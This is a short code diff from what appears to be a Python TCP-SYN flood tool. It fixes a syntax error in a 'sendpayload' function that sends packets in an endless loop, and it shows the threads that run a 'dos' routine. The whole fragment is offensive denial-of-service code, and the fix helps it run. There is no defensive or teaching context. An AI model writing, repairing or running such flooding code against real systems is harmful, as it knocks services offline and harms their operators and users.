@@ -60,7 +60,7 @@ print("Interactive mode (TCP-SYN flood)")
 print("")
 print("---> Press CTRL+C to stop the payload!")
 print("-----------------------------------------")
-def sendpayload()
+def sendpayload():
     send(p, loop=1, verbose=0)
 for i in range(0, threads):
     thr = threading.Thread(target=dos, args=(p,))
